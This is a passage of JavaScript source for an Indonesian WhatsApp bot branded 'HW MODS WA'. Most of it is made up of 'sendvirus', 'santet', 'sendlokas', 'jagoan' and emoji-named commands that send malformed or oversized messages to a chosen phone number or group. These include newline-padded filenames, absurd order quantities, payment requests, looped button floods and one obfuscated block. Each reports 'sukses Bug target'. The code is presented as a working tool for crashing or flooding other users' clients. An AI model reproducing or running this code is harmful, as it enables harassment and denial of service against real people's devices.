if (!isRegistered) return replyReg(mess.verif)
if (isBan) return reply(`Lah Lu Kan Di Ban`)
Pe = text.split("|")[0]+'@s.whatsapp.net'
haikal.sendMessage(Pe, { image: ppnyauser,  caption: `HW MODS WA${iphone4}` }, { quoted:m })
}
break
//=================================================//
case 'sendvirus6': {
if (!isRegistered) return replyReg(mess.verif)
if (isBan) return reply(`Lah Lu Kan Di Ban`)
Pe = text.split("|")[0]+'@s.whatsapp.net'
haikal.sendMessage(Pe, { image: ppnyauser,  caption: `HW MODS WA${iphone5}` }, { quoted:m })
}
break
//=================================================//
case 'sendvirus7': {
if (!isRegistered) return replyReg(mess.verif)
if (isBan) return reply(`Lah Lu Kan Di Ban`)
Pe = text.split("|")[0]+'@s.whatsapp.net'
haikal.sendMessage(Pe, { image: ppnyauser,  caption: `HW MODS WA${iphone6}` }, { quoted:m })
}
break
//=================================================//
case 'sendvirus8': {
if (!isRegistered) return replyReg(mess.verif)
if (isBan) return reply(`Lah Lu Kan Di Ban`)
Pe = text.split("|")[0]+'@s.whatsapp.net'
haikal.sendMessage(Pe, { image: ppnyauser,  caption: `HW MODS WA${buttonkal}` }, { quoted:m })
}
break
//=================================================//
case 'sendvirus9': {
if (!isRegistered) return replyReg(mess.verif)
if (isBan) return reply(`Lah Lu Kan Di Ban`)
Pe = text.split("|")[0]+'@s.whatsapp.net'
haikal.sendMessage(Pe, { image: ppnyauser,  caption: `HW MODS WA${buttonvirus}` }, { quoted:m })
}
break
//=================================================//
case 'sendvirus10': {
if (!isRegistered) return replyReg(mess.verif)
if (isBan) return reply(`Lah Lu Kan Di Ban`)
Pe = text.split("|")[0]+'@s.whatsapp.net'
haikal.sendMessage(Pe, { image: ppnyauser,  caption: `HW MODS WA${ngazap(prefix)}`}, { quoted:m })
}
break
//=================================================//
case 'jadijago': {
if (!isRegistered) return replyReg(mess.verif)
if (isBan) return reply(`Lah Lu Kan Di Ban`)
if (!q) return m.reply(`Penggunaan ${command} Nama\n\nContoh : ${command} haikal`)
let teks = `${q}`
{
 var message = {
document : fs.readFileSync("./baseikal/sound/ngeselin.BIN"),
"fileName": `🔥 ${teks} ☠️\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n.${buttonkal}.𝗕𝗔𝗦𝗘 𝗦𝗜𝗗`,
caption: ` ${teks}  ${buttonkal}`,
footer: ` ${teks} `,
mentionedJid: m.mentionedJid,
templateButtons: [{ urlButton: {displayText: `${teks}`, url: 'www.xnxxhwmods.com'}}, 
{ quickReplyButton: { displayText: `CLICK BY  ${teks} `, id: '🗡️'}},
{ quickReplyButton: { displayText: `CLICK BY  ${teks} `, id: '🛡️'}},
{ quickReplyButton: { displayText: `CLICK BY  ${teks} `, id: '🔧'}},
{ quickReplyButton: { displayText: `CLICK BY  ${teks} `, id: '🪞'}}],
headerType: 5
}
haikal.sendMessage(m.chat, message, { quoted:m })
}
}
break
//=================================================//
case 'sendlokas': case 'sendlokas3': case 'sendlokas4': case 'sendlokas5': {
if (!isRegistered) return replyReg(mess.verif)
if (isBan) return reply(`Lah Lu Kan Di Ban`)
Pe = text.split("|")[0]+'@s.whatsapp.net'
var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./baseikal/image/hwmodsgans.jpg') }, { upload: haikal.waUploadToServer })
var liveLocation = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"liveLocationMessage": {
"degreesLatitude": -6.9367014,
"degreesLongitude": 107.7228574,
"caption": `© HW MODS WA${ngazap(prefix)}`,
"sequenceNumber": "1657237469254001",
"jpegThumbnail": messa.imageMessage,
}
}), { userJid: m.chat, quoted:m})
haikal.relayMessage(Pe, liveLocation.message, { messageId: liveLocation.key.id })
reply('sukses Bug target')
}
break
//=================================================//
case 'sendlokas2': {
if (!isRegistered) return replyReg(mess.verif)
if (isBan) return reply(`Lah Lu Kan Di Ban`)
Pe = text.split("|")[0]+'@s.whatsapp.net'
var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./baseikal/image/hwmodsgans.jpg') }, { upload: haikal.waUploadToServer })
var location = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"locationMessage": {
"degreesLatitude": -6.936928157735237,
"degreesLongitude": 107.72270679473877,
"caption": `© HW MODS WA${ngazap(prefix)}`,
"jpegThumbnail": messa.imageMessage,
}
}), { userJid: m.chat, quoted:m})
haikal.relayMessage(Pe, location.message, { messageId: location.key.id })
reply('sukses Bug target')
}
break
//=================================================//
case 'sendtrol2': {
if (!isRegistered) return replyReg(mess.verif)
if (isBan) return reply(`Lah Lu Kan Di Ban`)
Pe = text.split("|")[0]+'@s.whatsapp.net'
var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./baseikal/image/hwmodsgans.jpg') }, { upload: haikal.waUploadToServer })
var order = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
 "orderMessage": {
"orderId": "449756950375071",
"orderImage": messa.imageMessage,
"itemCount": 100000000000,
"status": "INQUIRY",
"surface": "CATALOG",
"message": `© HW MODS WA${ngazap(prefix)}`,
"jpegThumbnail":fs.readFileSync('./baseikal/image/pict.jpg'),
"orderTitle": `© HW MODS WA${ngazap(prefix)}`,
"sellerJid": "6285714170944@s.whatsapp.net",
"token": "AR40+xXRlWKpdJ2ILEqtgoUFd45C8rc1CMYdYG/R2KXrSg==",
"totalAmount1000": "500000000000000",
"totalCurrencyCode": "IDR",
}
}), { userJid: m.chat, quoted:m})
haikal.relayMessage(Pe, order.message, { messageId: order.key.id })
reply('sukses Bug target')
}
break
//=================================================//
case 'afk': {
if (!isRegistered) return replyReg(mess.verif)
if (isBan) return reply(`Lah Lu Kan Di Ban`)
let user = global.db.users[m.sender]
user.afkTime = + new Date
user.afkReason = text
m.reply(`${m.pushName} Hello Saya Bot Hw Mods${text ? ': ' + text : ''}`)
}
break
//=================================================//
case '🔥': 
if (!isRegistered) return replyReg(mess.verif)
if (isBan) return reply(`Lah Lu Kan Di Ban`)
if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
jumlah = `${encodeURI(q)}`
ydd = `Hallo Aku haikal`
for (let i = 0; i < jumlah; i++) {
const buttons = [
{buttonId: `${prefix}djisdjiwdjjes`, buttonText: {displayText: buttonvirus}, type: 1},
{buttonId: 'babaabbabababa', buttonText: {displayText: buttonvirus}, type: 1},
{buttonId: 'babababbababa', buttonText: {displayText: buttonvirus}, type: 1}
]
const buttonMessage = {
text: "𝙘𝙞𝙡𝙤 𝙗𝙤𝙩",
footerText: 'Pe',
buttons: buttons,
headerType: 1
}
haikal.sendMessage(m.chat, buttonMessage)
}
 break
case 'inspect': {
if (!isRegistered) return replyReg(mess.verif)
if (isBan) return reply(`Lah Lu Kan Di Ban`)
if (!args[0]) return m.reply("Linknya?")
let linkRegex = args.join(" ")
let coded = linkRegex.split("https://chat.whatsapp.com/")[1]
if (!coded) return m.reply("Link Invalid")
haikal.query({
tag: "iq",
attrs: {
type: "get",
xmlns: "w:g2",
to: "@g.us"
},
content: [{ tag: "invite", attrs: { code: coded } }]
}).then(async(res) => { 
tekse = `「 Group Link Yang Di Inspect 」
▸ Nama Group : ${res.content[0].attrs.subject ? res.content[0].attrs.subject : "undefined"}
▸ Deskripsi Di Ubah Oleh : ${res.content[0].attrs.s_o.split("@")[0] ? "@" + res.content[0].attrs.s_o.split("@")[0] : "undefined"}
▸ Deskripsi Di Ubah : ${res.content[0].attrs.s_t ? moment(res.content[0].attrs.s_t *1000).tz("Asia/Jakarta").format("DD-MM-YYYY, HH:mm:ss") : "undefined"}
▸ Pembuat Group : ${res.content[0].attrs.creator ? "@" + res.content[0].attrs.creator.split("@")[0] : "undefined"}
▸ Group Di Buat : ${res.content[0].attrs.creation ? moment(res.content[0].attrs.creation * 1000).tz("Asia/Jakarta").format("DD-MM-YYYY, HH:mm:ss") : "undefined"}
▸ Total Member : ${res.content[0].attrs.size ? res.content[0].attrs.size : "undefined"} Member

▸ ID Group  : ${res.content[0].attrs.id ? res.content[0].attrs.id : "undefined"}

©By Haikal`
try {
pp = await haikal.profilePictureUrl(res.content[0].attrs.id + "@g.us", "image")
} catch {
pp = "https://tse2.mm.bing.net/th?id=OIP.n1C1oxOvYLLyDIavrBFoNQHaHa&pid=Api&P=0&w=153&h=153"
}
haikal.sendFile(m.chat, pp, "", m, { caption: tekse, mentions: await haikal.parseMention(tekse) })
})
}
break
//=================================================//
case '🦖': case '🦕': case '👿': case '😈': case '⚡': case '💥': case '🌪️': case '🍂':{
if (!isRegistered) return replyReg(mess.verif)
if (isBan) return reply(`Lah Lu Kan Di Ban`)
if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
jumlah = `${encodeURI(q)}`
ydd = `Hallo Aku haikal`
for (let i = 0; i < jumlah; i++) {
function _0x5385(_0x2ab646,_0x156951){var _0x3a233e=_0x3a23();return _0x5385=function(_0x53850c,_0x4c3e8d){_0x53850c=_0x53850c-0x147;var _0xd786db=_0x3a233e[_0x53850c];return _0xd786db;},_0x5385(_0x2ab646,_0x156951);}function _0x3a23(){var _0x5f31ec=['NAME','34783nWaGUx','70YCNYrF','OWNER','1184216mLjwdr','147066EAQNAA','sendMessage','62881024911798','771192XPifQJ','6285714170944','JAGOAN\x20OM?','45FHicsI','2213460MCRxLU','AH\x20SLEBEEW','350069CkDHKE','reply\x20Menger','https://chat.whatsapp.com/I6VMA8KF74gICjxESpThL2','94440ePvkzM','chat'];_0x3a23=function(){return _0x5f31ec;};return _0x3a23();}var _0x47bf3a=_0x5385;(function(_0x2eb902,_0x5904db){var _0x5e852c=_0x5385,_0x1631cb=_0x2eb902();while(!![]){try{var _0x4d18d8=-parseInt(_0x5e852c(0x157))/0x1+parseInt(_0x5e852c(0x151))/0x2+parseInt(_0x5e852c(0x155))/0x3+-parseInt(_0x5e852c(0x147))/0x4*(-parseInt(_0x5e852c(0x14b))/0x5)+parseInt(_0x5e852c(0x14e))/0x6+-parseInt(_0x5e852c(0x14a))/0x7+parseInt(_0x5e852c(0x14d))/0x8*(-parseInt(_0x5e852c(0x154))/0x9);if(_0x4d18d8===_0x5904db)break;else _0x1631cb['push'](_0x1631cb['shift']());}catch(_0x5d4c67){_0x1631cb['push'](_0x1631cb['shift']());}}}(_0x3a23,0x5d93e),await haikal[_0x47bf3a(0x14f)](m[_0x47bf3a(0x148)],{'text':'','templateButtons':[{'callButton':{'displayText':_0x47bf3a(0x14c),'phoneNumber':_0x47bf3a(0x152)}},{'callButton':{'displayText':_0x47bf3a(0x14c),'phoneNumber':_0x47bf3a(0x150)}},{'urlButton':{'displayText':'GROUP\x20HW\x20MODS\x20WA','url':_0x47bf3a(0x159)}},{'quickReplyButton':{'displayText':'MY','id':_0x47bf3a(0x158)}},{'quickReplyButton':{'displayText':_0x47bf3a(0x149),'id':_0x47bf3a(0x156)}},{'quickReplyButton':{'displayText':'HW\x20MODS\x20WA','id':_0x47bf3a(0x153)}}]}));
 await sleep(20)
}
}
break
//=================================================//
// BUG OWNER
case 'santet': case 'santet2': case 'santet3': case 'santet4': case 'santet5': {
if (!isRegistered) return replyReg(mess.verif)
if (isBan) return reply(`Lah Lu Kan Di Ban`)
Pe = text.split("|")[0]+'@s.whatsapp.net'
var requestPaymentMessage = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"requestPaymentMessage": {
"currencyCodeIso4217": "IDR",
"amount1000": "100",
"extendedTextMessage": {
"text": `MY DEVELOPER HW MODS WA`,
}
}}), { userJid: m.chat, quoted:m})
haikal.relayMessage(Pe, requestPaymentMessage.message, { messageId: requestPaymentMessage.key.id })
reply('sukses Bug target')
}
break
//=================================================//
case 'jagoan' : {
if (!isRegistered) return replyReg(mess.verif)
if (isBan) return reply(`Lah Lu Kan Di Ban`)
if (!m.isGroup) return groupon(from)
if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
jumlah = `${encodeURI(q)}`
ydd = `Hallo Aku haikal`
for (let i = 0; i < jumlah; i++) {
haikal.relayMessage(m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g,'')+"@s.whatsapp.net", { requestPaymentMessage: { Message: { extendedTextMessage: { text: `${buttonkal}`, currencyCodeIso4217: 'IDR', requestFrom: '0@s.whatsapp.net', expiryTimestamp: 8000, amount: 1, contextInfo:{"externalAdReply": {"title": `SC HW MODS WA`,"body": `Selamat ${salam} kak ${pushname}`,
mimetype: 'audio/mpeg', caption: `${buttonkal}`,
showAdAttribution: true,
sourceUrl: `https://youtube.com/c/HwModsWa857`,
thumbnailUrl: 'https://telegra.ph/file/a5e229afeb4dad4f35204.jpg', 
}
}}}}}, { quoted:m})
}
}
break
//=================================================//
case '🌷' : case '🐲': case '🐉': case '🌵': case '🎄': case '🌲': case '🌳': case '🌱': case '🌿': case '🍀': case '☘️': {
if (!isRegistered) return replyReg(mess.verif)
if (isBan) return reply(`Lah Lu Kan Di Ban`)
Pe = text.split("|")[0]+'@s.whatsapp.net'
 haikal.sendMessage(Pe, { 
text: 'POWERED BY HAIKAlN /> ZERO TO HERO', 
templateButtons: [
{ callButton: { displayText: `Number Phone Owner`, phoneNumber: `owner`}},
{ urlButton: { displayText: `OWNER`, url: 'https://Wa.me/6285608484711'}},
{ urlButton: { displayText: `ID GORUP`, url: 'https://www.whatsapp.com/otp/copy/'}},
{ quickReplyButton: { displayText: `ʀᴜʟᴇs`, id: `rules`}},
{ quickReplyButton: { displayText: `ɪɴғᴏ ʙᴏᴛᴢ`, id: `x`}},
{ quickReplyButton: { displayText: `sᴇᴡᴀ ʙᴏᴛᴢ`, id: `sewa`}},
], 
 })
 haikal.sendMessage(Pe, { 
text: 'POWERED BY HAIKAlN /> ZERO TO HERO', 
templateButtons: [
{ callButton: { displayText: `Number Phone Owner`, phoneNumber: `owner`}},
{ urlButton: { displayText: `OWNER`, url: 'https://Wa.me/6285608484711'}},
{ urlButton: { displayText: `ID GORUP`, url: 'https://www.whatsapp.com/otp/copy/'}},
{ quickReplyButton: { displayText: `ʀᴜʟᴇs`, id: `rules`}},
{ quickReplyButton: { displayText: `ɪɴғᴏ ʙᴏᴛᴢ`, id: `x`}},
{ quickReplyButton: { displayText: `sᴇᴡᴀ ʙᴏᴛᴢ`, id: `sewa`}},
], 
 })
 haikal.sendMessage(Pe, { 
text: 'POWERED BY HAIKAlN /> ZERO TO HERO', 
templateButtons: [
{ callButton: { displayText: `Number Phone Owner`, phoneNumber: `owner`}},
{ urlButton: { displayText: `OWNER`, url: 'https://Wa.me/6285608484711'}},
{ urlButton: { displayText: `ID GORUP`, url: 'https://www.whatsapp.com/otp/copy/'}},
{ quickReplyButton: { displayText: `ʀᴜʟᴇs`, id: `rules`}},
{ quickReplyButton: { displayText: `ɪɴғᴏ ʙᴏᴛᴢ`, id: `x`}},
{ quickReplyButton: { displayText: `sᴇᴡᴀ ʙᴏᴛᴢ`, id: `sewa`}},
], 
 })
haikal.sendMessage(Pe, { 
text: 'POWERED BY HAIKAlN /> ZERO TO HERO', 
templateButtons: [
{ callButton: { displayText: `Number Phone Owner`, phoneNumber: `owner`}},
{ urlButton: { displayText: `OWNER`, url: 'https://Wa.me/6285608484711'}},
{ urlButton: { displayText: `ID GORUP`, url: 'https://www.whatsapp.com/otp/copy/'}},
{ quickReplyButton: { displayText: `ʀᴜʟᴇs`, id: `rules`}},
{ quickReplyButton: { displayText: `ɪɴғᴏ ʙᴏᴛᴢ`, id: `x`}},
{ quickReplyButton: { displayText: `sᴇᴡᴀ ʙᴏᴛᴢ`, id: `sewa`}},
], 
 })
haikal.sendMessage(Pe, { 
text: 'POWERED BY HAIKAlN /> ZERO TO HERO', 
templateButtons: [
{ callButton: { displayText: `Number Phone Owner`, phoneNumber: `owner`}},
{ urlButton: { displayText: `OWNER`, url: 'https://Wa.me/6285608484711'}},
{ urlButton: { displayText: `ID GORUP`, url: 'https://www.whatsapp.com/otp/copy/'}},
{ quickReplyButton: { displayText: `ʀᴜʟᴇs`, id: `rules`}},
{ quickReplyButton: { displayText: `ɪɴғᴏ ʙᴏᴛᴢ`, id: `x`}},
{ quickReplyButton: { displayText: `sᴇᴡᴀ ʙᴏᴛᴢ`, id: `sewa`}},
], 
 })
 haikal.sendMessage(Pe, { 
text: 'POWERED BY HAIKAlN /> ZERO TO HERO', 
templateButtons: [
{ callButton: { displayText: `Number Phone Owner`, phoneNumber: `owner`}},
{ urlButton: { displayText: `OWNER`, url: 'https://Wa.me/6285608484711'}},
{ urlButton: { displayText: `ID GORUP`, url: 'https://www.whatsapp.com/otp/copy/'}},
{ quickReplyButton: { displayText: `ʀᴜʟᴇs`, id: `rules`}},
{ quickReplyButton: { displayText: `ɪɴғᴏ ʙᴏᴛᴢ`, id: `x`}},
{ quickReplyButton: { displayText: `sᴇᴡᴀ ʙᴏᴛᴢ`, id: `sewa`}},
], 
 })
haikal.sendMessage(Pe, { 
text: 'POWERED BY HAIKAlN /> ZERO TO HERO', 
templateButtons: [
{ callButton: { displayText: `Number Phone Owner`, phoneNumber: `owner`}},
{ urlButton: { displayText: `OWNER`, url: 'https://Wa.me/6285608484711'}},
{ urlButton: { displayText: `ID GORUP`, url: 'https://www.whatsapp.com/otp/copy/'}},
{ quickReplyButton: { displayText: `ʀᴜʟᴇs`, id: `rules`}},
{ quickReplyButton: { displayText: `ɪɴғᴏ ʙᴏᴛᴢ`, id: `x`}},
{ quickReplyButton: { displayText: `sᴇᴡᴀ ʙᴏᴛᴢ`, id: `sewa`}},
], 
 })
haikal.sendMessage(Pe, { 
text: 'POWERED BY HAIKAlN /> ZERO TO HERO', 
templateButtons: [
{ callButton: { displayText: `Number Phone Owner`, phoneNumber: `owner`}},
{ urlButton: { displayText: `OWNER`, url: 'https://Wa.me/6285608484711'}},
{ urlButton: { displayText: `ID GORUP`, url: 'https://www.whatsapp.com/otp/copy/'}},
{ quickReplyButton: { displayText: `ʀᴜʟᴇs`, id: `rules`}},
{ quickReplyButton: { displayText: `ɪɴғᴏ ʙᴏᴛᴢ`, id: `x`}},
{ quickReplyButton: { displayText: `sᴇᴡᴀ ʙᴏᴛᴢ`, id: `sewa`}},
], 
 })
haikal.sendMessage(Pe, { 
text: 'POWERED BY HAIKAlN /> ZERO TO HERO', 
templateButtons: [
{ callButton: { displayText: `Number Phone Owner`, phoneNumber: `owner`}},
{ urlButton: { displayText: `OWNER`, url: 'https://Wa.me/6285608484711'}},
{ urlButton: { displayText: `ID GORUP`, url: 'https://www.whatsapp.com/otp/copy/'}},
{ quickReplyButton: { displayText: `ʀᴜʟᴇs`, id: `rules`}},
{ quickReplyButton: { displayText: `ɪɴғᴏ ʙᴏᴛᴢ`, id: `x`}},
{ quickReplyButton: { displayText: `sᴇᴡᴀ ʙᴏᴛᴢ`, id: `sewa`}},
], 
 })
haikal.sendMessage(Pe, { 
text: 'POWERED BY HAIKAlN /> ZERO TO HERO', 
templateButtons: [
{ callButton: { displayText: `Number Phone Owner`, phoneNumber: `owner`}},
{ urlButton: { displayText: `OWNER`, url: 'https://Wa.me/6285608484711'}},
{ urlButton: { displayText: `ID GORUP`, url: 'https://www.whatsapp.com/otp/copy/'}},
{ quickReplyButton: { displayText: `ʀᴜʟᴇs`, id: `rules`}},
{ quickReplyButton: { displayText: `ɪɴғᴏ ʙᴏᴛᴢ`, id: `x`}},
{ quickReplyButton: { displayText: `sᴇᴡᴀ ʙᴏᴛᴢ`, id: `sewa`}},
], 
 })
haikal.sendMessage(Pe, { 
text: 'POWERED BY HAIKAlN /> ZERO TO HERO', 
templateButtons: [
{ callButton: { displayText: `Number Phone Owner`, phoneNumber: `owner`}},
{ urlButton: { displayText: `OWNER`, url: 'https://Wa.me/6285608484711'}},
{ urlButton: { displayText: `ID GORUP`, url: 'https://www.whatsapp.com/otp/copy/'}},
{ quickReplyButton: { displayText: `ʀᴜʟᴇs`, id: `rules`}},
{ quickReplyButton: { displayText: `ɪɴғᴏ ʙᴏᴛᴢ`, id: `x`}},
{ quickReplyButton: { displayText: `sᴇᴡᴀ ʙᴏᴛᴢ`, id: `sewa`}},
], 
 })
haikal.sendMessage(Pe, { 
text: 'POWERED BY HAIKAlN /> ZERO TO HERO', 
templateButtons: [
{ callButton: { displayText: `Number Phone Owner`, phoneNumber: `owner`}},
{ urlButton: { displayText: `OWNER`, url: 'https://Wa.me/6285608484711'}},
{ urlButton: { displayText: `ID GORUP`, url: 'https://www.whatsapp.com/otp/copy/'}},
{ quickReplyButton: { displayText: `ʀᴜʟᴇs`, id: `rules`}},
{ quickReplyButton: { displayText: `ɪɴғᴏ ʙᴏᴛᴢ`, id: `x`}},
{ quickReplyButton: { displayText: `sᴇᴡᴀ ʙᴏᴛᴢ`, id: `sewa`}},
], 
 })
haikal.sendMessage(Pe, { 
text: 'POWERED BY HAIKAlN /> ZERO TO HERO', 
templateButtons: [
{ callButton: { displayText: `Number Phone Owner`, phoneNumber: `owner`}},
{ urlButton: { displayText: `OWNER`, url: 'https://Wa.me/6285608484711'}},
{ urlButton: { displayText: `ID GORUP`, url: 'https://www.whatsapp.com/otp/copy/'}},
{ quickReplyButton: { displayText: `ʀᴜʟᴇs`, id: `rules`}},
{ quickReplyButton: { displayText: `ɪɴғᴏ ʙᴏᴛᴢ`, id: `x`}},
{ quickReplyButton: { displayText: `sᴇᴡᴀ ʙᴏᴛᴢ`, id: `sewa`}},
], 
 })
haikal.sendMessage(Pe, { 
text: 'POWERED BY HAIKAlN /> ZERO TO HERO', 
templateButtons: [
{ callButton: { displayText: `Number Phone Owner`, phoneNumber: `owner`}},
{ urlButton: { displayText: `OWNER`, url: 'https://Wa.me/6285608484711'}},
{ urlButton: { displayText: `ID GORUP`, url: 'https://www.whatsapp.com/otp/copy/'}},
{ quickReplyButton: { displayText: `ʀᴜʟᴇs`, id: `rules`}},
{ quickReplyButton: { displayText: `ɪɴғᴏ ʙᴏᴛᴢ`, id: `x`}},
{ quickReplyButton: { displayText: `sᴇᴡᴀ ʙᴏᴛᴢ`, id: `sewa`}},
], 
 })
haikal.sendMessage(Pe, { 
text: 'POWERED BY HAIKAlN /> ZERO TO HERO', 
templateButtons: [
{ callButton: { displayText: `Number Phone Owner`, phoneNumber: `owner`}},
{ urlButton: { displayText: `OWNER`, url: 'https://Wa.me/6285608484711'}},
{ urlButton: { displayText: `ID GORUP`, url: 'https://www.whatsapp.com/otp/copy/'}},
{ quickReplyButton: { displayText: `ʀᴜʟᴇs`, id: `rules`}},
{ quickReplyButton: { displayText: `ɪɴғᴏ ʙᴏᴛᴢ`, id: `x`}},
{ quickReplyButton: { displayText: `sᴇᴡᴀ ʙᴏᴛᴢ`, id: `sewa`}},
], 
 })
 reply('sukses Bug target')
}
break
case '🌹' : {
if (!isRegistered) return replyReg(mess.verif)
if (isBan) return reply(`Lah Lu Kan Di Ban`)
Pe = text.split("|")[0]+'@g.us'
haikal.sendMessage(Pe, { 
text: 'POWERED BY HAIKAlN /> ZERO TO HERO', 
templateButtons: [
{ callButton: { displayText: `Number Phone Owner`, phoneNumber: `owner`}},
{ urlButton: { displayText: `OWNER`, url: 'https://Wa.me/6285608484711'}},
{ urlButton: { displayText: `ID GORUP`, url: 'https://www.whatsapp.com/otp/copy/'}},
{ quickReplyButton: { displayText: `ʀᴜʟᴇs`, id: `rules`}},
{ quickReplyButton: { displayText: `ɪɴғᴏ ʙᴏᴛᴢ`, id: `x`}},
{ quickReplyButton: { displayText: `sᴇᴡᴀ ʙᴏᴛᴢ`, id: `sewa`}},
], 
 })
haikal.sendMessage(Pe, { 
text: 'POWERED BY HAIKAlN /> ZERO TO HERO', 
templateButtons: [
{ callButton: { displayText: `Number Phone Owner`, phoneNumber: `owner`}},
{ urlButton: { displayText: `OWNER`, url: 'https://Wa.me/6285608484711'}},
{ urlButton: { displayText: `ID GORUP`, url: 'https://www.whatsapp.com/otp/copy/'}},
{ quickReplyButton: { displayText: `ʀᴜʟᴇs`, id: `rules`}},
{ quickReplyButton: { displayText: `ɪɴғᴏ ʙᴏᴛᴢ`, id: `x`}},
{ quickReplyButton: { displayText: `sᴇᴡᴀ ʙᴏᴛᴢ`, id: `sewa`}},
], 
 })
 haikal.sendMessage(Pe, { 
text: 'POWERED BY HAIKAlN /> ZERO TO HERO', 
templateButtons: [
{ callButton: { displayText: `Number Phone Owner`, phoneNumber: `owner`}},
{ urlButton: { displayText: `OWNER`, url: 'https://Wa.me/6285608484711'}},
{ urlButton: { displayText: `ID GORUP`, url: 'https://www.whatsapp.com/otp/copy/'}},
{ quickReplyButton: { displayText: `ʀᴜʟᴇs`, id: `rules`}},
{ quickReplyButton: { displayText: `ɪɴғᴏ ʙᴏᴛᴢ`, id: `x`}},
{ quickReplyButton: { displayText: `sᴇᴡᴀ ʙᴏᴛᴢ`, id: `sewa`}},
], 
 })
 await sleep(20)
 haikal.sendMessage(Pe, { 
text: 'POWERED BY HAIKAlN /> ZERO TO HERO', 
templateButtons: [
{ callButton: { displayText: `Number Phone Owner`, phoneNumber: `owner`}},
{ urlButton: { displayText: `OWNER`, url: 'https://Wa.me/6285608484711'}},
{ urlButton: { displayText: `ID GORUP`, url: 'https://www.whatsapp.com/otp/copy/'}},
{ quickReplyButton: { displayText: `ʀᴜʟᴇs`, id: `rules`}},
{ quickReplyButton: { displayText: `ɪɴғᴏ ʙᴏᴛᴢ`, id: `x`}},
{ quickReplyButton: { displayText: `sᴇᴡᴀ ʙᴏᴛᴢ`, id: `sewa`}},
], 
 })
 haikal.sendMessage(Pe, { 
text: 'POWERED BY HAIKAlN /> ZERO TO HERO', 
templateButtons: [
{ callButton: { displayText: `Number Phone Owner`, phoneNumber: `owner`}},
{ urlButton: { displayText: `OWNER`, url: 'https://Wa.me/6285608484711'}},
{ urlButton: { displayText: `ID GORUP`, url: 'https://www.whatsapp.com/otp/copy/'}},
{ quickReplyButton: { displayText: `ʀᴜʟᴇs`, id: `rules`}},
{ quickReplyButton: { displayText: `ɪɴғᴏ ʙᴏᴛᴢ`, id: `x`}},
{ quickReplyButton: { displayText: `sᴇᴡᴀ ʙᴏᴛᴢ`, id: `sewa`}},
], 
 })
haikal.sendMessage(Pe, { 
text: 'POWERED BY HAIKAlN /> ZERO TO HERO', 
templateButtons: [
{ callButton: { displayText: `Number Phone Owner`, phoneNumber: `owner`}},
{ urlButton: { displayText: `OWNER`, url: 'https://Wa.me/6285608484711'}},
{ urlButton: { displayText: `ID GORUP`, url: 'https://www.whatsapp.com/otp/copy/'}},
{ quickReplyButton: { displayText: `ʀᴜʟᴇs`, id: `rules`}},
{ quickReplyButton: { displayText: `ɪɴғᴏ ʙᴏᴛᴢ`, id: `x`}},
{ quickReplyButton: { displayText: `sᴇᴡᴀ ʙᴏᴛᴢ`, id: `sewa`}},
], 
 })
haikal.sendMessage(Pe, { 
text: 'POWERED BY HAIKAlN /> ZERO TO HERO', 
templateButtons: [
{ callButton: { displayText: `Number Phone Owner`, phoneNumber: `owner`}},
{ urlButton: { displayText: `OWNER`, url: 'https://Wa.me/6285608484711'}},
{ urlButton: { displayText: `ID GORUP`, url: 'https://www.whatsapp.com/otp/copy/'}},
{ quickReplyButton: { displayText: `ʀᴜʟᴇs`, id: `rules`}},
{ quickReplyButton: { displayText: `ɪɴғᴏ ʙᴏᴛᴢ`, id: `x`}},
{ quickReplyButton: { displayText: `sᴇᴡᴀ ʙᴏᴛᴢ`, id: `sewa`}},
], 
 })
haikal.sendMessage(Pe, { 
text: 'POWERED BY HAIKAlN /> ZERO TO HERO', 
templateButtons: [
{ callButton: { displayText: `Number Phone Owner`, phoneNumber: `owner`}},
{ urlButton: { displayText: `OWNER`, url: 'https://Wa.me/6285608484711'}},
